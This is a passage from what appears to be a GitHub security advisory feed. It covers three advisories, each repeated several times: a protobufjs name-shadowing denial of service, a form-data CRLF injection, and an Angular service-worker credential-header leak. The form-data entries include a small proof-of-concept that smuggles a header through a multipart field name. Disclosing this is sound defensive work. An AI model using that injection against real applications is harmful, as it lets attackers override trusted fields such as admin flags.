<p>Do not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.</p>
<p>Applications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7">https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7</a></li>
<li><a href="https://github.com/advisories/GHSA-f38q-mgvj-vph7">https://github.com/advisories/GHSA-f38q-mgvj-vph7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f38q-mgvj-vph7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T17:27:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[protobufjs-cli] protobufjs : Schema-derived names can shadow runtime-significant properties]]></title>
        <id>https://github.com/advisories/GHSA-f38q-mgvj-vph7</id>
        <link href="https://github.com/advisories/GHSA-f38q-mgvj-vph7"/>
        <updated>2026-06-15T17:27:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>protobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named <code>hasOwnProperty</code>, field or oneof names such as <code>$type</code> when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is <code>rpcCall</code>.</p>
<p>When affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.</p>
<p>Applications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.</p>
<p>The issue is not known to allow code execution by itself.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>The application must use an affected protobufjs version.</li>
<li>The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:<ul>
<li>a field named <code>hasOwnProperty</code>,</li>
<li>a field or oneof named <code>$type</code> through protobufjs JSON/reflection descriptor input,</li>
<li>or a service method whose generated helper name is <code>rpcCall</code>.</li>
</ul>
</li>
<li>The application must reach the affected API path for that name: required-field decode post-checks, <code>verify</code>, or <code>toObject</code> for <code>hasOwnProperty</code>; reflected message JSON serialization for <code>$type</code>; or protobufjs RPC service invocation for <code>rpcCall</code>.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Do not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.</p>
<p>Applications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7">https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7</a></li>
<li><a href="https://github.com/advisories/GHSA-f38q-mgvj-vph7">https://github.com/advisories/GHSA-f38q-mgvj-vph7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f38q-mgvj-vph7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T17:27:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[protobufjs] protobufjs : Schema-derived names can shadow runtime-significant properties]]></title>
        <id>https://github.com/advisories/GHSA-f38q-mgvj-vph7</id>
        <link href="https://github.com/advisories/GHSA-f38q-mgvj-vph7"/>
        <updated>2026-06-15T17:27:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>protobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named <code>hasOwnProperty</code>, field or oneof names such as <code>$type</code> when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is <code>rpcCall</code>.</p>
<p>When affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.</p>
<p>Applications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.</p>
<p>The issue is not known to allow code execution by itself.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>The application must use an affected protobufjs version.</li>
<li>The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:<ul>
<li>a field named <code>hasOwnProperty</code>,</li>
<li>a field or oneof named <code>$type</code> through protobufjs JSON/reflection descriptor input,</li>
<li>or a service method whose generated helper name is <code>rpcCall</code>.</li>
</ul>
</li>
<li>The application must reach the affected API path for that name: required-field decode post-checks, <code>verify</code>, or <code>toObject</code> for <code>hasOwnProperty</code>; reflected message JSON serialization for <code>$type</code>; or protobufjs RPC service invocation for <code>rpcCall</code>.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Do not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.</p>
<p>Applications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7">https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7</a></li>
<li><a href="https://github.com/advisories/GHSA-f38q-mgvj-vph7">https://github.com/advisories/GHSA-f38q-mgvj-vph7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f38q-mgvj-vph7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T17:27:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[form-data] form-data: CRLF injection in form-data via unescaped multipart field names and filenames]]></title>
        <id>https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</id>
        <link href="https://github.com/advisories/GHSA-hmw2-7cc7-3qxx"/>
        <updated>2026-06-15T17:26:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>form-data</code> builds <code>multipart/form-data</code> request bodies. Through v4.0.5, the <code>field</code> name passed to <code>FormData#append</code> and the <code>filename</code> option are concatenated directly into the <code>Content-Disposition</code> header with no escaping of CR (<code>\r</code>), LF (<code>\n</code>), or <code>"</code>. An application that uses <strong>untrusted input as a field name or filename</strong> therefore lets an attacker terminate the header line and either inject additional headers or smuggle whole additional multipart parts into the request the application forwards to a backend.</p>
<p>This is CWE-93 (CRLF injection). It is a divergence from how browsers and the WHATWG HTML spec serialize form-data (they escape these characters), so the fix is to match that behavior. Severity is <strong>conditional</strong>: it depends on the consuming application passing attacker-controlled data as a field name or filename. Applications that only use fixed/trusted field names are not affected.</p>
<h2 id="details">Details</h2>
<p>In <code>lib/form_data.js</code>, <code>_multiPartHeader</code> builds the part header as:</p>
<pre><code class="language-javascript">'Content-Disposition': ['form-data', 'name="' + field + '"'].concat(contentDisposition || [])
</code></pre>
<p>and <code>_getContentDisposition</code> builds <code>filename="' + filename + '"'</code>. Neither escapes control characters, so a <code>\r\n</code> in <code>field</code>/<code>filename</code> ends the header line. The same applies to <code>"</code>, which can break out of the quoted parameter.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-javascript">const FormData = require('form-data');
const form = new FormData();
form.append('email"\r\nX-Injected: true\r\nfake="', 'user@example.com');
console.log(form.getBuffer().toString());
</code></pre>
<p>Before the fix this emits an injected <code>X-Injected: true</code> header line. A field name that also includes <code>--&lt;boundary&gt;</code> sequences can introduce additional parts (e.g. an extra <code>name="is_admin"</code> field), which a downstream parser accepts as legitimate.</p>
<h2 id="impact">Impact</h2>
<p>For an application that uses untrusted field names/filenames:</p>
<ul>
<li><strong>Field injection / override (integrity).</strong> Inject or override fields the backend trusts (e.g. <code>is_admin</code>, <code>role</code>) — the primary demonstrated impact.</li>
<li><strong>Header injection</strong> into the generated multipart part.</li>
</ul>
<p>Claims of guaranteed privilege escalation, authentication bypass, high confidentiality impact, and availability impact are application-dependent downstream consequences, not properties of <code>form-data</code> itself, and are not demonstrated by the PoC.</p>
<h3 id="severity">Severity</h3>
<p>The demonstrated, library-attributable impact is integrity (field/header injection); there is no demonstrated confidentiality disclosure or availability impact in <code>form-data</code> itself, and exploitation requires the consuming app to feed untrusted data into field names/filenames. A Moderate (≈5.3, <code>I:L</code>) rating is also defensible given that precondition.</p>
<h2 id="patch">Patch</h2>
<p>Fixed in <strong>4.0.6</strong>, <strong>3.0.5</strong>, and <strong>2.5.6</strong>. Users on older 0.x/1.x/2.x releases should upgrade to 2.5.6 or later.</p>
<p>The fix escapes <code>\r</code>, <code>\n</code>, and <code>"</code> as <code>%0D</code>, <code>%0A</code>, and <code>%22</code> in field names and filenames, matching the WHATWG HTML <code>multipart/form-data</code> encoding algorithm that browsers implement. This neutralizes the injection while leaving ordinary field names (including <code>name[0]</code>, dotted, and unicode names) unchanged.</p>
<h2 id="workaround">Workaround</h2>
<p>Until upgrading, validate or reject field names/filenames that contain control characters before calling <code>append</code>:</p>
<pre><code class="language-javascript">if (/[\r\n]/.test(field)) { throw new Error('invalid field name'); }
</code></pre>
<h2 id="credit">Credit</h2>
<p>Reported by <a href="https://github.com/yueyueL">yueyueL</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx">https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12143">https://nvd.nist.gov/vuln/detail/CVE-2026-12143</a></li>
<li><a href="https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435">https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435</a></li>
<li><a href="https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229">https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229</a></li>
<li><a href="https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045">https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045</a></li>
<li><a href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data">https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data</a></li>
<li><a href="https://www.npmjs.com/package/form-data">https://www.npmjs.com/package/form-data</a></li>
<li><a href="https://github.com/advisories/GHSA-hmw2-7cc7-3qxx">https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:26:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[form-data] form-data: CRLF injection in form-data via unescaped multipart field names and filenames]]></title>
        <id>https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</id>
        <link href="https://github.com/advisories/GHSA-hmw2-7cc7-3qxx"/>
        <updated>2026-06-15T17:26:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>form-data</code> builds <code>multipart/form-data</code> request bodies. Through v4.0.5, the <code>field</code> name passed to <code>FormData#append</code> and the <code>filename</code> option are concatenated directly into the <code>Content-Disposition</code> header with no escaping of CR (<code>\r</code>), LF (<code>\n</code>), or <code>"</code>. An application that uses <strong>untrusted input as a field name or filename</strong> therefore lets an attacker terminate the header line and either inject additional headers or smuggle whole additional multipart parts into the request the application forwards to a backend.</p>
<p>This is CWE-93 (CRLF injection). It is a divergence from how browsers and the WHATWG HTML spec serialize form-data (they escape these characters), so the fix is to match that behavior. Severity is <strong>conditional</strong>: it depends on the consuming application passing attacker-controlled data as a field name or filename. Applications that only use fixed/trusted field names are not affected.</p>
<h2 id="details">Details</h2>
<p>In <code>lib/form_data.js</code>, <code>_multiPartHeader</code> builds the part header as:</p>
<pre><code class="language-javascript">'Content-Disposition': ['form-data', 'name="' + field + '"'].concat(contentDisposition || [])
</code></pre>
<p>and <code>_getContentDisposition</code> builds <code>filename="' + filename + '"'</code>. Neither escapes control characters, so a <code>\r\n</code> in <code>field</code>/<code>filename</code> ends the header line. The same applies to <code>"</code>, which can break out of the quoted parameter.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-javascript">const FormData = require('form-data');
const form = new FormData();
form.append('email"\r\nX-Injected: true\r\nfake="', 'user@example.com');
console.log(form.getBuffer().toString());
</code></pre>
<p>Before the fix this emits an injected <code>X-Injected: true</code> header line. A field name that also includes <code>--&lt;boundary&gt;</code> sequences can introduce additional parts (e.g. an extra <code>name="is_admin"</code> field), which a downstream parser accepts as legitimate.</p>
<h2 id="impact">Impact</h2>
<p>For an application that uses untrusted field names/filenames:</p>
<ul>
<li><strong>Field injection / override (integrity).</strong> Inject or override fields the backend trusts (e.g. <code>is_admin</code>, <code>role</code>) — the primary demonstrated impact.</li>
<li><strong>Header injection</strong> into the generated multipart part.</li>
</ul>
<p>Claims of guaranteed privilege escalation, authentication bypass, high confidentiality impact, and availability impact are application-dependent downstream consequences, not properties of <code>form-data</code> itself, and are not demonstrated by the PoC.</p>
<h3 id="severity">Severity</h3>
<p>The demonstrated, library-attributable impact is integrity (field/header injection); there is no demonstrated confidentiality disclosure or availability impact in <code>form-data</code> itself, and exploitation requires the consuming app to feed untrusted data into field names/filenames. A Moderate (≈5.3, <code>I:L</code>) rating is also defensible given that precondition.</p>
<h2 id="patch">Patch</h2>
<p>Fixed in <strong>4.0.6</strong>, <strong>3.0.5</strong>, and <strong>2.5.6</strong>. Users on older 0.x/1.x/2.x releases should upgrade to 2.5.6 or later.</p>
<p>The fix escapes <code>\r</code>, <code>\n</code>, and <code>"</code> as <code>%0D</code>, <code>%0A</code>, and <code>%22</code> in field names and filenames, matching the WHATWG HTML <code>multipart/form-data</code> encoding algorithm that browsers implement. This neutralizes the injection while leaving ordinary field names (including <code>name[0]</code>, dotted, and unicode names) unchanged.</p>
<h2 id="workaround">Workaround</h2>
<p>Until upgrading, validate or reject field names/filenames that contain control characters before calling <code>append</code>:</p>
<pre><code class="language-javascript">if (/[\r\n]/.test(field)) { throw new Error('invalid field name'); }
</code></pre>
<h2 id="credit">Credit</h2>
<p>Reported by <a href="https://github.com/yueyueL">yueyueL</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx">https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12143">https://nvd.nist.gov/vuln/detail/CVE-2026-12143</a></li>
<li><a href="https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435">https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435</a></li>
<li><a href="https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229">https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229</a></li>
<li><a href="https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045">https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045</a></li>
<li><a href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data">https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data</a></li>
<li><a href="https://www.npmjs.com/package/form-data">https://www.npmjs.com/package/form-data</a></li>
<li><a href="https://github.com/advisories/GHSA-hmw2-7cc7-3qxx">https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:26:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[form-data] form-data: CRLF injection in form-data via unescaped multipart field names and filenames]]></title>
        <id>https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</id>
        <link href="https://github.com/advisories/GHSA-hmw2-7cc7-3qxx"/>
        <updated>2026-06-15T17:26:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>form-data</code> builds <code>multipart/form-data</code> request bodies. Through v4.0.5, the <code>field</code> name passed to <code>FormData#append</code> and the <code>filename</code> option are concatenated directly into the <code>Content-Disposition</code> header with no escaping of CR (<code>\r</code>), LF (<code>\n</code>), or <code>"</code>. An application that uses <strong>untrusted input as a field name or filename</strong> therefore lets an attacker terminate the header line and either inject additional headers or smuggle whole additional multipart parts into the request the application forwards to a backend.</p>
<p>This is CWE-93 (CRLF injection). It is a divergence from how browsers and the WHATWG HTML spec serialize form-data (they escape these characters), so the fix is to match that behavior. Severity is <strong>conditional</strong>: it depends on the consuming application passing attacker-controlled data as a field name or filename. Applications that only use fixed/trusted field names are not affected.</p>
<h2 id="details">Details</h2>
<p>In <code>lib/form_data.js</code>, <code>_multiPartHeader</code> builds the part header as:</p>
<pre><code class="language-javascript">'Content-Disposition': ['form-data', 'name="' + field + '"'].concat(contentDisposition || [])
</code></pre>
<p>and <code>_getContentDisposition</code> builds <code>filename="' + filename + '"'</code>. Neither escapes control characters, so a <code>\r\n</code> in <code>field</code>/<code>filename</code> ends the header line. The same applies to <code>"</code>, which can break out of the quoted parameter.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-javascript">const FormData = require('form-data');
const form = new FormData();
form.append('email"\r\nX-Injected: true\r\nfake="', 'user@example.com');
console.log(form.getBuffer().toString());
</code></pre>
<p>Before the fix this emits an injected <code>X-Injected: true</code> header line. A field name that also includes <code>--&lt;boundary&gt;</code> sequences can introduce additional parts (e.g. an extra <code>name="is_admin"</code> field), which a downstream parser accepts as legitimate.</p>
<h2 id="impact">Impact</h2>
<p>For an application that uses untrusted field names/filenames:</p>
<ul>
<li><strong>Field injection / override (integrity).</strong> Inject or override fields the backend trusts (e.g. <code>is_admin</code>, <code>role</code>) — the primary demonstrated impact.</li>
<li><strong>Header injection</strong> into the generated multipart part.</li>
</ul>
<p>Claims of guaranteed privilege escalation, authentication bypass, high confidentiality impact, and availability impact are application-dependent downstream consequences, not properties of <code>form-data</code> itself, and are not demonstrated by the PoC.</p>
<h3 id="severity">Severity</h3>
<p>The demonstrated, library-attributable impact is integrity (field/header injection); there is no demonstrated confidentiality disclosure or availability impact in <code>form-data</code> itself, and exploitation requires the consuming app to feed untrusted data into field names/filenames. A Moderate (≈5.3, <code>I:L</code>) rating is also defensible given that precondition.</p>
<h2 id="patch">Patch</h2>
<p>Fixed in <strong>4.0.6</strong>, <strong>3.0.5</strong>, and <strong>2.5.6</strong>. Users on older 0.x/1.x/2.x releases should upgrade to 2.5.6 or later.</p>
<p>The fix escapes <code>\r</code>, <code>\n</code>, and <code>"</code> as <code>%0D</code>, <code>%0A</code>, and <code>%22</code> in field names and filenames, matching the WHATWG HTML <code>multipart/form-data</code> encoding algorithm that browsers implement. This neutralizes the injection while leaving ordinary field names (including <code>name[0]</code>, dotted, and unicode names) unchanged.</p>
<h2 id="workaround">Workaround</h2>
<p>Until upgrading, validate or reject field names/filenames that contain control characters before calling <code>append</code>:</p>
<pre><code class="language-javascript">if (/[\r\n]/.test(field)) { throw new Error('invalid field name'); }
</code></pre>
<h2 id="credit">Credit</h2>
<p>Reported by <a href="https://github.com/yueyueL">yueyueL</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx">https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12143">https://nvd.nist.gov/vuln/detail/CVE-2026-12143</a></li>
<li><a href="https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435">https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435</a></li>
<li><a href="https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229">https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229</a></li>
<li><a href="https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045">https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045</a></li>
<li><a href="https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data">https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data</a></li>
<li><a href="https://www.npmjs.com/package/form-data">https://www.npmjs.com/package/form-data</a></li>
<li><a href="https://github.com/advisories/GHSA-hmw2-7cc7-3qxx">https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hmw2-7cc7-3qxx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:26:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/service-worker] @angular/service-worker: Sensitive Header Leakage on Cross-Origin Redirects in Angular Service Worker]]></title>
        <id>https://github.com/advisories/GHSA-qxh6-94w6-9r5p</id>
        <link href="https://github.com/advisories/GHSA-qxh6-94w6-9r5p"/>
        <updated>2026-06-15T17:25:55.000Z</updated>
        <content type="html"><![CDATA[<p>An information disclosure vulnerability exists in the <code>@angular/service-worker</code> package of the Angular framework. When the Service Worker fetches assets, it preserves metadata (such as headers) from the original request. However, on cross-origin redirects, the Service Worker fails to strip sensitive headers, violating the Fetch redirect algorithm. </p>
<p>This allows a remote attacker to obtain sensitive credentials (e.g., <code>Authorization</code> tokens, <code>Proxy-Authorization</code> credentials, or session cookies) by triggering a cross-origin redirect to an untrusted external origin.</p>
<h3 id="impact">Impact</h3>
<p>If an application configured with the Angular Service Worker fetches assets with credential headers (such as <code>Authorization</code> header), and one of those requests is redirected to a different origin, the Service Worker will forward those headers to the new origin. This exposes critical credentials and session identifiers to unauthorized third-party servers.</p>
<h3 id="attack-preconditions">Attack Preconditions</h3>
<p>For this vulnerability to be exploitable:</p>
<ol>
<li><strong>Vulnerable Configuration:</strong> The application must utilize the <code>@angular/service-worker</code> package to fetch assets.</li>
<li><strong>Credentialed Requests:</strong> The application must attach sensitive request headers (like <code>Authorization</code>, <code>Proxy-Authorization</code>, or rely on cookies) to asset-group requests.</li>
<li><strong>Redirect Flow:</strong> These requests must encounter a cross-origin redirect to an attacker-controlled or untrusted domain.</li>
</ol>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1  </li>
<li>21.2.17  </li>
<li>20.3.25</li>
</ul>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and reported by <a href="https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/">CodeMender from Google DeepMind</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p">https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p</a></li>
<li><a href="https://github.com/angular/angular/pull/69029">https://github.com/angular/angular/pull/69029</a></li>
<li><a href="https://github.com/angular/angular/commit/47d68dcb26266316647133ab6385e77fc3e5ae08">https://github.com/angular/angular/commit/47d68dcb26266316647133ab6385e77fc3e5ae08</a></li>
<li><a href="https://github.com/advisories/GHSA-qxh6-94w6-9r5p">https://github.com/advisories/GHSA-qxh6-94w6-9r5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxh6-94w6-9r5p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:25:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/service-worker] @angular/service-worker: Sensitive Header Leakage on Cross-Origin Redirects in Angular Service Worker]]></title>
        <id>https://github.com/advisories/GHSA-qxh6-94w6-9r5p</id>
        <link href="https://github.com/advisories/GHSA-qxh6-94w6-9r5p"/>
        <updated>2026-06-15T17:25:55.000Z</updated>
        <content type="html"><![CDATA[<p>An information disclosure vulnerability exists in the <code>@angular/service-worker</code> package of the Angular framework. When the Service Worker fetches assets, it preserves metadata (such as headers) from the original request. However, on cross-origin redirects, the Service Worker fails to strip sensitive headers, violating the Fetch redirect algorithm. </p>
<p>This allows a remote attacker to obtain sensitive credentials (e.g., <code>Authorization</code> tokens, <code>Proxy-Authorization</code> credentials, or session cookies) by triggering a cross-origin redirect to an untrusted external origin.</p>
<h3 id="impact">Impact</h3>
<p>If an application configured with the Angular Service Worker fetches assets with credential headers (such as <code>Authorization</code> header), and one of those requests is redirected to a different origin, the Service Worker will forward those headers to the new origin. This exposes critical credentials and session identifiers to unauthorized third-party servers.</p>
<h3 id="attack-preconditions">Attack Preconditions</h3>
<p>For this vulnerability to be exploitable:</p>
<ol>
<li><strong>Vulnerable Configuration:</strong> The application must utilize the <code>@angular/service-worker</code> package to fetch assets.</li>
<li><strong>Credentialed Requests:</strong> The application must attach sensitive request headers (like <code>Authorization</code>, <code>Proxy-Authorization</code>, or rely on cookies) to asset-group requests.</li>
<li><strong>Redirect Flow:</strong> These requests must encounter a cross-origin redirect to an attacker-controlled or untrusted domain.</li>
</ol>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1  </li>
<li>21.2.17  </li>
<li>20.3.25</li>
</ul>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and reported by <a href="https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/">CodeMender from Google DeepMind</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p">https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p</a></li>
<li><a href="https://github.com/angular/angular/pull/69029">https://github.com/angular/angular/pull/69029</a></li>
<li><a href="https://github.com/angular/angular/commit/47d68dcb26266316647133ab6385e77fc3e5ae08">https://github.com/angular/angular/commit/47d68dcb26266316647133ab6385e77fc3e5ae08</a></li>
<li><a href="https://github.com/advisories/GHSA-qxh6-94w6-9r5p">https://github.com/advisories/GHSA-qxh6-94w6-9r5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxh6-94w6-9r5p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:25:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/service-worker] @angular/service-worker: Sensitive Header Leakage on Cross-Origin Redirects in Angular Service Worker]]></title>
        <id>https://github.com/advisories/GHSA-qxh6-94w6-9r5p</id>
        <link href="https://github.com/advisories/GHSA-qxh6-94w6-9r5p"/>
        <updated>2026-06-15T17:25:55.000Z</updated>
        <content type="html"><![CDATA[<p>An information disclosure vulnerability exists in the <code>@angular/service-worker</code> package of the Angular framework. When the Service Worker fetches assets, it preserves metadata (such as headers) from the original request. However, on cross-origin redirects, the Service Worker fails to strip sensitive headers, violating the Fetch redirect algorithm. </p>
<p>This allows a remote attacker to obtain sensitive credentials (e.g., <code>Authorization</code> tokens, <code>Proxy-Authorization</code> credentials, or session cookies) by triggering a cross-origin redirect to an untrusted external origin.</p>
<h3 id="impact">Impact</h3>
<p>If an application configured with the Angular Service Worker fetches assets with credential headers (such as <code>Authorization</code> header), and one of those requests is redirected to a different origin, the Service Worker will forward those headers to the new origin. This exposes critical credentials and session identifiers to unauthorized third-party servers.</p>
<h3 id="attack-preconditions">Attack Preconditions</h3>
<p>For this vulnerability to be exploitable:</p>
<ol>
<li><strong>Vulnerable Configuration:</strong> The application must utilize the <code>@angular/service-worker</code> package to fetch assets.</li>
<li><strong>Credentialed Requests:</strong> The application must attach sensitive request headers (like <code>Authorization</code>, <code>Proxy-Authorization</code>, or rely on cookies) to asset-group requests.</li>
<li><strong>Redirect Flow:</strong> These requests must encounter a cross-origin redirect to an attacker-controlled or untrusted domain.</li>
</ol>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1  </li>
<li>21.2.17  </li>
<li>20.3.25</li>
</ul>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and reported by <a href="https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/">CodeMender from Google DeepMind</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p">https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p</a></li>
